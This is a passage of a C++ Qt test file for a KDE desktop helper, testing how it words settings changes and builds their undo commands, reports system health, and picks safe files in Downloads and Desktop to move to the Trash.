        QVERIFY(look.question.contains(QLatin1String("Colors changed from Breeze Dark to Breeze Light")));

        // A color scheme set for the first time says so, by its name.
        SettingsChange scheme{at, QStringLiteral("kdeglobals"), QStringLiteral("General"), QStringLiteral("ColorScheme"),
                              QString(), QStringLiteral("ShuffleDark"), false, true};
        QCOMPARE(SettingRows::words(scheme).title, QStringLiteral("Colors set to Shuffle Dark"));

        // An app's own shortcut at its own keys coming or going, as KWin's
        // do when an effect is loaded or unloaded, is nobody's change; one
        // set away from its keys is.
        SettingsChange arrives{at, QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin"), QStringLiteral("Cycle Overview"),
                               QString(), QStringLiteral("Meta+Tab,Meta+Tab,"), false, true};
        QVERIFY(!SettingRows::words(arrives).meaningful);
        SettingsChange leaves{at, QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin"), QStringLiteral("MoveZoomDown"),
                              QStringLiteral("Meta+Down,Meta+Down,"), QString(), true, false};
        QVERIFY(!SettingRows::words(leaves).meaningful);
        SettingsChange set{at, QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin"), QStringLiteral("MoveZoomDown"),
                           QStringLiteral("none,none,"), QStringLiteral("Meta+Down,none,"), true, true};
        QCOMPARE(SettingRows::words(set).title, QStringLiteral("Shortcut added for Move zoom down"));

        // KWin's list of which action undoes which, swapped at every start,
        // is no key binding at all.
        SettingsChange inverse{at, QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin][$InverseAction"),
                               QStringLiteral("MoveZoomDown"), QStringLiteral("MoveZoomUp"), QString(), true, false};
        QVERIFY(!SettingRows::words(inverse).meaningful);
        SettingsChange inverseIn{at, QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin][$InverseAction"),
                                 QStringLiteral("Cycle Overview"), QString(), QStringLiteral("Cycle Overview Opposite"), false, true};
        QVERIFY(SettingRows::rows({inverse, inverseIn}, QStringLiteral("split-rock")).isEmpty());

        // A shortcut of one's own taken out at a restart and written back as
        // it was makes no row.
        SettingsChange out{at, QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin"), QStringLiteral("Tile windows"),
                           QStringLiteral("Meta+T,none,Tile windows"), QString(), true, false};
        SettingsChange in{at.addSecs(600), QStringLiteral("kglobalshortcutsrc"), QStringLiteral("kwin"), QStringLiteral("Tile windows"),
                          QString(), QStringLiteral("Meta+T,none,Tile windows"), false, true};
        QVERIFY(SettingRows::rows({out, in}, QStringLiteral("split-rock")).isEmpty());
        QCOMPARE(SettingRows::rows({out}, QStringLiteral("split-rock")).size(), 1);

        // The screen lock's 0 minutes is never.
        SettingsChange lock{at, QStringLiteral("kscreenlockerrc"), QStringLiteral("Daemon"), QStringLiteral("Timeout"),
                            QStringLiteral("0"), QStringLiteral("7"), true, true};
        QCOMPARE(SettingRows::words(lock).title, QStringLiteral("Screen locks after 7 minutes"));
        QCOMPARE(SettingRows::words(lock).wasNow, QStringLiteral("Was: never"));
        std::swap(lock.before, lock.after);
        QCOMPARE(SettingRows::words(lock).title, QStringLiteral("Screen no longer locks by itself"));
        QCOMPARE(SettingRows::words(lock).wasNow, QStringLiteral("Was after 7 minutes"));

        // A value such as -1 is written as a value, never read as an option;
        // a key that wasn't there before goes again.
        SettingsChange never{at, QStringLiteral("powerdevilrc"), QStringLiteral("AC][Display"),
                             QStringLiteral("TurnOffDisplayIdleTimeoutSec"), QStringLiteral("-1"), QStringLiteral("900"), true, true};
        QVERIFY2(SettingRows::command(never, true, program)
                     .startsWith(QStringLiteral("kwriteconfig6 --file 'powerdevilrc' --group 'AC' --group 'Display' "
                                                "--key 'TurnOffDisplayIdleTimeoutSec' --notify -- '-1' && ")),
                 qPrintable(SettingRows::command(never, true, program)));
        never.wasSet = false;
        QCOMPARE(SettingRows::command(never, true, program),
                 QStringLiteral("kwriteconfig6 --file 'powerdevilrc' --group 'AC' --group 'Display' "
                                "--key 'TurnOffDisplayIdleTimeoutSec' --notify --delete"));

        // A second screen KWin knew on the same connector is put back on the
        // screen in that connector now.
        SettingsChange monitor{at, QStringLiteral("kwinoutputconfig.json"), QStringLiteral("DP-1 (DEL A123)"), QStringLiteral("scale"),
                               QStringLiteral("1.5"), QStringLiteral("1"), true, true};
        QCOMPARE(SettingRows::command(monitor, true, program), QStringLiteral("kscreen-doctor 'output.DP-1.scale.1.5'"));
        QCOMPARE(SettingRows::words(monitor).title, QStringLiteral("Screen on DP-1: scale 150% to 100%"));

        // Put back by hand since: the row says so, and offers nothing.
        const auto before = [](const SettingsChange &change, bool *set) {
            *set = change.wasSet;
            return change.before;
        };
        for (const SettingRow &row : SettingRows::rows(history.changes(), program, before))
            QVERIFY2(row.alreadyBack, qPrintable(row.title));

        // Changed and changed back within two minutes: no row.
        SettingsChange on = history.changes().constFirst();
        SettingsChange off = on;
        std::swap(off.before, off.after);
        off.when = on.when.addSecs(30);
        QVERIFY(SettingRows::rows({on, off}, program).isEmpty());

        // On the card, after a look: the row, its way back, and what it
        // copies for help.
        const QString look2 = QStringLiteral("@@ snapper\n@@ end\n");
        RecentChanges::Look card = RecentChanges::readLook(look2, {}, at.addSecs(600), SettingRows::rows(history.changes(), program),
                                                           history.keptSince());
        QMap<QString, RecentChanges::Item> items;
        for (const RecentChanges::Item &item : card.items)
            items.insert(item.title, item);
        const RecentChanges::Item scaleItem = items.value(QStringLiteral("Built-in screen: scale 175% to 150%"));
        QCOMPARE(scaleItem.action, QStringLiteral("putback"));
        QCOMPARE(scaleItem.actionLabel, QStringLiteral("Put back"));
        QCOMPARE(scaleItem.confirmTitle, QStringLiteral("Put it back as it was?"));
        QVERIFY(scaleItem.confirmSub.contains(QLatin1String("No password needed")));
        QVERIFY(scaleItem.help.contains(QLatin1String("kwinoutputconfig.json [eDP-1] scale: 1.75 to 1.5")));
        QCOMPARE(items.value(QStringLiteral("Colors changed from Breeze Dark to Breeze Light")).action, QStringLiteral("settings"));
    }

    void whatChangedOpensByNameAndUndoesFromTheCard()
    {
        RecentChanges recent;
        recent.setLookScript(printing(QStringLiteral("recent-look.txt")));
        QList<ChangeRunner::Record> records;
        ChangeRunner::Record pointer;
        pointer.id = QStringLiteral("c1");
        pointer.made = QDateTime::currentDateTime();
        pointer.proposal.title = QStringLiteral("Use the Bibata pointer");
        pointer.proposal.undo = QStringLiteral("plasma-apply-cursortheme breeze_cursors");
        pointer.status = QStringLiteral("done");
        records.append(pointer);
        recent.setRecords([&records] { return records; });
        recent.check();
        QCOMPARE(recent.stage(), QStringLiteral("looking"));
        QTRY_COMPARE(recent.stage(), QStringLiteral("ready"));
        QCOMPARE(recent.latestMap().value(QStringLiteral("change")).toString(), QStringLiteral("c1"));
        QVERIFY(recent.question().contains(QLatin1String("Use the Bibata pointer")));
        // Once undone, it has nothing more to undo, without looking again.
        records.first().status = QStringLiteral("undone");
        records.first().undone = QDateTime::currentDateTime();
        recent.refreshOwn();
        QVERIFY(recent.latestMap().isEmpty());
    }

    void theHealthCheckSeesRestartsPackagesAndDownloads()
    {
        const QString look = fixture(QStringLiteral("health-look.txt")).replace(
            QStringLiteral("@@ end"),
            QStringLiteral("@@ kernel\n6.17.1-2-cachyos\nmissing\n@@ packages\nerror: missing 'libfoo' dependency for 'bar'\n"
                           "@@ lock\n@@ downloads\n900000000\n400000000\n@@ end"));
        QMap<QString, HealthCheck::Item> byId;
        for (const HealthCheck::Item &i : HealthCheck::readLook(look, Now))
            byId.insert(i.id, i);
        QCOMPARE(byId.value(QStringLiteral("restart")).action, QStringLiteral("restart"));
        QCOMPARE(HealthCheck::tile(byId.value(QStringLiteral("restart"))), QStringLiteral("Restart to finish the update"));
        QCOMPARE(byId.value(QStringLiteral("packages")).state, QStringLiteral("bad"));
        QVERIFY(byId.value(QStringLiteral("packages")).question.contains(QLatin1String("libfoo")));
        QCOMPARE(byId.value(QStringLiteral("downloads")).action, QStringLiteral("downloads"));
        QVERIFY(byId.value(QStringLiteral("downloads")).detail.startsWith(QLatin1String("2 files")));

        // An install cut off is said before anything about the list.
        QString stuck = look;
        stuck.replace(QStringLiteral("@@ lock\n"), QStringLiteral("@@ lock\nstuck\n"));
        for (const HealthCheck::Item &i : HealthCheck::readLook(stuck, Now)) {
            if (i.id == QLatin1String("packages"))
                QCOMPARE(HealthCheck::tile(i), QStringLiteral("An update was cut off"));
        }
        // Nothing found, nothing said.
        for (const HealthCheck::Item &i : HealthCheck::readLook(fixture(QStringLiteral("health-look.txt")), Now))
            QVERIFY(i.id != QLatin1String("restart") && i.id != QLatin1String("packages") && i.id != QLatin1String("downloads"));
    }

    void installersAreNamedForTheirApps()
    {
        QCOMPARE(TidyUp::installerFor(QStringLiteral("zoom-6.2.0-1-x86_64.pkg.tar.zst")), QStringLiteral("zoom"));
        QCOMPARE(TidyUp::installerFor(QStringLiteral("visual-studio-code-bin-1.95.0-1-x86_64.pkg.tar.zst")),
                 QStringLiteral("visual-studio-code-bin"));
        QCOMPARE(TidyUp::installerFor(QStringLiteral("zoom_x86_64.pkg.tar.xz")), QStringLiteral("zoom"));
        QCOMPARE(TidyUp::installerFor(QStringLiteral("steam_latest.deb")), QStringLiteral("steam"));
        QCOMPARE(TidyUp::installerFor(QStringLiteral("google-chrome-stable-131.0-1.x86_64.rpm")),
                 QStringLiteral("google-chrome-stable"));
        QCOMPARE(TidyUp::installerFor(QStringLiteral("com.spotify.Client.flatpakref")), QStringLiteral("com.spotify.client"));
        QCOMPARE(TidyUp::installerFor(QStringLiteral("report.pdf")), QString());
        QCOMPARE(TidyUp::installerFor(QStringLiteral("firefox-131.0.tar.bz2")), QString());
    }

    void tidyUpTicksOnlyWhatIsPlainlySafe()
    {
        const TidyUp::Look look = TidyUp::readLook(fixture(QStringLiteral("tidy-look.txt")), Now.toSecsSinceEpoch());
        QCOMPARE(look.heldKb, qint64(7864320));
        QStringList ids;
        QMap<QString, TidyUp::File> byName;
        QMap<QString, QString> groupOf;
        for (const TidyUp::Group &group : look.groups) {
            ids.append(group.id);
            for (const TidyUp::File &file : group.files) {
                byName.insert(file.name, file);
                groupOf.insert(file.name, group.id);
            }
        }
        QCOMPARE(ids, (QStringList{QStringLiteral("installers"), QStringLiteral("copies"), QStringLiteral("old"),
                                   QStringLiteral("screenshots"), QStringLiteral("folders")}));
        // Folders whole, biggest first, never ticked.
        QCOMPARE(look.groups.at(4).files.first().name, QStringLiteral("Games temp"));
        QCOMPARE(look.groups.at(4).files.first().kb, qint64(234567890));
        QVERIFY(!look.groups.at(4).files.first().chosen);
        QVERIFY(look.groups.at(4).files.first().detail.startsWith(QStringLiteral("Folder · changed ")));
        QCOMPARE(look.groups.at(4).detail, QStringLiteral("2 folders, each with all it holds. Look before you tick"));
        // Installers of what is installed, and Windows programs: ticked.
        QCOMPARE(byName.value(QStringLiteral("zoom-6.2.0-1-x86_64.pkg.tar.zst")).detail, QStringLiteral("Zoom is installed"));
        QVERIFY(byName.value(QStringLiteral("zoom-6.2.0-1-x86_64.pkg.tar.zst")).chosen);
        QCOMPARE(byName.value(QStringLiteral("ZoomInstaller.exe")).detail, QStringLiteral("Windows only"));
        QVERIFY(byName.value(QStringLiteral("ZoomInstaller.exe")).chosen);
        QCOMPARE(byName.value(QStringLiteral("steam_latest.deb")).detail, QStringLiteral("Steam is installed"));
        // An AppImage run lately is kept; one unused for months is only old.
        QVERIFY(byName.value(QStringLiteral("Obsidian-1.7.AppImage")).kept);
        QVERIFY(!byName.value(QStringLiteral("Obsidian-1.7.AppImage")).chosen);
        QCOMPARE(groupOf.value(QStringLiteral("Old-Thing-1.0.AppImage")), QStringLiteral("old"));
        // An installer for an app that isn't installed, recent: not offered.
        QVERIFY(!byName.contains(QStringLiteral("gimp-2.10.rpm")));
        // A copy the same as its original: ticked. A copy that isn't, recent: not offered.
        QCOMPARE(groupOf.value(QStringLiteral("report (1).pdf")), QStringLiteral("copies"));
        QVERIFY(byName.value(QStringLiteral("report (1).pdf")).chosen);
        QCOMPARE(byName.value(QStringLiteral("report (1).pdf")).detail, QStringLiteral("The same as report.pdf"));
        QVERIFY(!byName.contains(QStringLiteral("notes (2).txt")));
        // Old files and screenshots: listed, never ticked.
        QCOMPARE(groupOf.value(QStringLiteral("report.pdf")), QStringLiteral("old"));
        QCOMPARE(groupOf.value(QStringLiteral("firefox-131.0.tar.bz2")), QStringLiteral("old"));
        QVERIFY(!byName.value(QStringLiteral("holiday.mov")).chosen);
        QCOMPARE(groupOf.value(QStringLiteral("Screenshot_20261006_101500.png")), QStringLiteral("screenshots"));
        QVERIFY(!byName.value(QStringLiteral("Screenshot_20260801_090000.png")).chosen);
        // A download still arriving, and a fresh one: left alone.
        QVERIFY(!byName.contains(QStringLiteral("big.iso.part")));
        QVERIFY(!byName.contains(QStringLiteral("fresh.zip")));

        QCOMPARE(look.groups.at(0).detail, QStringLiteral("3 files for apps already installed, or for Windows"));
        QCOMPARE(look.groups.at(1).detail, QStringLiteral("\"report (1).pdf\", the same as the one it copies"));
        QCOMPARE(look.groups.at(2).detail, QStringLiteral("4 files. Look before you tick"));
        QCOMPARE(look.groups.at(3).detail, QStringLiteral("2 in Downloads and on the Desktop"));
        // Biggest first, what is kept last.
        QCOMPARE(look.groups.at(0).files.first().name, QStringLiteral("zoom-6.2.0-1-x86_64.pkg.tar.zst"));
        QCOMPARE(look.groups.at(0).files.last().name, QStringLiteral("Obsidian-1.7.AppImage"));
    }

    void tidyUpMovesWhatIsTickedToTheTrash()
    {
        // Real files in folders of the test's own, looked at with the real look,
        // in the test's home, on the drive its Trash is on.
        QTemporaryDir home(QDir::homePath() + QStringLiteral("/tidy-XXXXXX"));
        const QString downloads = home.filePath(QStringLiteral("Downloads"));
        const QString desktop = home.filePath(QStringLiteral("Desktop"));
        QVERIFY(write(downloads + QStringLiteral("/report.pdf"), QStringLiteral("the report")));
        QVERIFY(write(downloads + QStringLiteral("/report (1).pdf"), QStringLiteral("the report")));
        QVERIFY(write(downloads + QStringLiteral("/report (2).pdf"), QStringLiteral("the report, changed")));
        QVERIFY(write(downloads + QStringLiteral("/ChromeSetup.exe"), QStringLiteral("MZ")));
        QVERIFY(write(downloads + QStringLiteral("/.hidden"), QStringLiteral("x")));
        QVERIFY(write(desktop + QStringLiteral("/old notes.txt"), QStringLiteral("notes")));
        QVERIFY(write(desktop + QStringLiteral("/Screenshot_20261001_120000.png"), QStringLiteral("png")));
        QVERIFY(write(desktop + QStringLiteral("/Games temp/save/slot1.dat"), QStringLiteral("save")));
        {
            QFile old(desktop + QStringLiteral("/old notes.txt"));
            QVERIFY(old.open(QIODevice::ReadWrite));
            const QDateTime then = QDateTime::currentDateTime().addDays(-45);
            QVERIFY(old.setFileTime(then, QFileDevice::FileModificationTime));
            QVERIFY(old.setFileTime(then, QFileDevice::FileAccessTime));
        }

        QTemporaryDir store;
        Helpers h(store.path());
        TidyUp *tidy = h.tidyUp();
        tidy->setFolders({downloads, desktop});
        QStringList reported;
        tidy->setReport([&reported](const QString &, bool ok, const QString &shown, const QString &) {
            reported.append(QStringLiteral("%1 %2").arg(ok).arg(shown));
        });
        QVERIFY(h.openChore(QStringLiteral("tidy")));
        QTRY_COMPARE(tidy->stage(), QStringLiteral("ready"));
        QStringList names;
        for (const TidyUp::Group &group : tidy->groups()) {
            for (const TidyUp::File &file : group.files)
                names.append(group.id + QLatin1Char(':') + file.name + (file.chosen ? QStringLiteral("+") : QString()));
        }
        names.sort();
        QCOMPARE(names, (QStringList{QStringLiteral("copies:report (1).pdf+"), QStringLiteral("folders:Games temp"),
                                     QStringLiteral("installers:ChromeSetup.exe+"), QStringLiteral("old:old notes.txt"),
                                     QStringLiteral("screenshots:Screenshot_20261001_120000.png")}));
        QCOMPARE(tidy->chosenCount(), 2);
        QVERIFY(tidy->heldWords().startsWith(QLatin1String("Downloads and Desktop hold ")));

        // A group ticked as a whole, and one file unticked again.
        tidy->choose(QStringLiteral("old"), true);
        QCOMPARE(tidy->chosenCount(), 3);
        tidy->chooseFile(downloads + QStringLiteral("/ChromeSetup.exe"), false);
        QCOMPARE(tidy->chosenCount(), 2);
        // A folder goes whole.
        tidy->choose(QStringLiteral("folders"), true);
        QCOMPARE(tidy->chosenCount(), 3);

        tidy->start();
        QCOMPARE(tidy->stage(), QStringLiteral("done"));
        QCOMPARE(tidy->moved(), 3);
        QVERIFY(!QFileInfo::exists(desktop + QStringLiteral("/Games temp")));
        QVERIFY(QFile::exists(QStandardPaths::writableLocation(QStandardPaths::GenericDataLocation)
                              + QStringLiteral("/Trash/files/Games temp/save/slot1.dat")));
        QVERIFY(tidy->missed().isEmpty());
        QVERIFY(!QFile::exists(downloads + QStringLiteral("/report (1).pdf")));
        QVERIFY(!QFile::exists(desktop + QStringLiteral("/old notes.txt")));
        QVERIFY(QFile::exists(downloads + QStringLiteral("/report.pdf")));
        QVERIFY(QFile::exists(downloads + QStringLiteral("/report (2).pdf")));
        QVERIFY(QFile::exists(downloads + QStringLiteral("/ChromeSetup.exe")));
        // In the Trash, where it can be put back.
        const QString trash = QStandardPaths::writableLocation(QStandardPaths::GenericDataLocation) + QStringLiteral("/Trash");
        QVERIFY(QFile::exists(trash + QStringLiteral("/files/report (1).pdf")));
        QVERIFY(QFile::exists(trash + QStringLiteral("/info/report (1).pdf.trashinfo")));
        QCOMPARE(reported, QStringList{QStringLiteral("1 3 files in the Trash")});
        QVERIFY(tidy->log().contains(QStringLiteral("Moved to the Trash: ") + desktop + QStringLiteral("/old notes.txt")));

        // Looked at again, the copy is gone.
        QVERIFY(h.openChore(QStringLiteral("tidy")));
        QTRY_COMPARE(tidy->stage(), QStringLiteral("ready"));
        for (const TidyUp::Group &group : tidy->groups())
            QVERIFY(group.id != QLatin1String("copies"));
        QDir(trash).removeRecursively();
    }

    void theTrashOpensInTheFileManagerFirst()
    {
        // Stand-ins for dbus-send and xdg-open, each writing down its call.
        QTemporaryDir bin;
        const auto stub = [&bin](const QString &name, const QByteArray &body) {
            QFile file(bin.filePath(name));
            QVERIFY(file.open(QIODevice::WriteOnly));
            file.write("#!/bin/sh\necho " + name.toUtf8() + " >> \"$STUB_LOG\"\n" + body);
            file.close();
            file.setPermissions(file.permissions() | QFileDevice::ExeOwner);
        };
        stub(QStringLiteral("dbus-send"), "case $STUB_BUS in\n"
             "answered) exit 0;;\n"
             "slow) echo 'Error org.freedesktop.DBus.Error.NoReply: no reply'; exit 1;;\n"
             "*) echo 'Error org.freedesktop.DBus.Error.ServiceUnknown: not provided'; exit 1;;\nesac\n");
        stub(QStringLiteral("xdg-open"), "");
        const QStringList opener = TidyUp::trashOpener();
        const auto calls = [&](const QString &bus) {
            QFile::remove(bin.filePath(QStringLiteral("log")));
            QProcess run;
            QProcessEnvironment environment = QProcessEnvironment::systemEnvironment();
            environment.insert(QStringLiteral("PATH"), bin.path() + QLatin1Char(':') + environment.value(QStringLiteral("PATH")));
            environment.insert(QStringLiteral("STUB_LOG"), bin.filePath(QStringLiteral("log")));
            environment.insert(QStringLiteral("STUB_BUS"), bus);
            run.setProcessEnvironment(environment);
            run.start(opener.first(), opener.mid(1));
            run.waitForFinished();
            QFile log(bin.filePath(QStringLiteral("log")));
            return log.open(QIODevice::ReadOnly) ? QString::fromUtf8(log.readAll()).split(QLatin1Char('\n'), Qt::SkipEmptyParts)
                                                 : QStringList();
        };
        // A file manager that answers, or took the request and is still
        // starting, shows it; only none on the bus goes on to xdg-open.
        QCOMPARE(calls(QStringLiteral("answered")), QStringList{QStringLiteral("dbus-send")});
        QCOMPARE(calls(QStringLiteral("slow")), QStringList{QStringLiteral("dbus-send")});
        QCOMPARE(calls(QStringLiteral("none")), (QStringList{QStringLiteral("dbus-send"), QStringLiteral("xdg-open")}));
    }

    void aHelperIsOpenedByName()
    {
        QTemporaryDir store;
        Helpers h(store.path());
        h.spaceCleanup()->setLookScript(printing(QStringLiteral("space-look.txt")));
        h.spaceCleanup()->setYoursScript(printing(QStringLiteral("yours-look.txt")));
        h.healthCheck()->setLookScript(printing(QStringLiteral("health-look.txt")));
        QVERIFY(!h.openChore(QStringLiteral("dishes")));
        QVERIFY(h.openChore(QStringLiteral("space")));
        QCOMPARE(h.chore(), QStringLiteral("space"));
        QVERIFY(h.choreBusy());
        // Never two at once.
        QVERIFY(!h.openChore(QStringLiteral("health")));
        QTRY_COMPARE(h.spaceCleanup()->stage(), QStringLiteral("ready"));
        QVERIFY(h.openChore(QStringLiteral("health")));
        QCOMPARE(h.chore(), QStringLiteral("health"));
        QCOMPARE(h.spaceCleanup()->stage(), QString());
        QTRY_COMPARE(h.healthCheck()->stage(), QStringLiteral("done"));
    }
};

QTEST_MAIN(TestChores)
#include "test_chores.moc"
